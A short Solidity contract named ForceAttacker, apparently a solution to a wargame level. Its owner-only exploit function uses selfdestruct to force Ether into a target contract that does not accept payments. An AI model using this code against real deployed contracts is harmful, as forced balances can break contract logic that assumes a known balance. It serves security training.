// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import { Ownable2Step } from "@openzeppelin-contracts/access/Ownable2Step.sol";

contract ForceAttacker is Ownable2Step {
    constructor() payable {
        // solhint-disable-previous-line no-empty-blocks
    }

    receive() external payable {
        // solhint-disable-previous-line no-empty-blocks
    }

    function exploit(address _forceAddr) external onlyOwner {
        selfdestruct(payable(_forceAddr));
    }
}
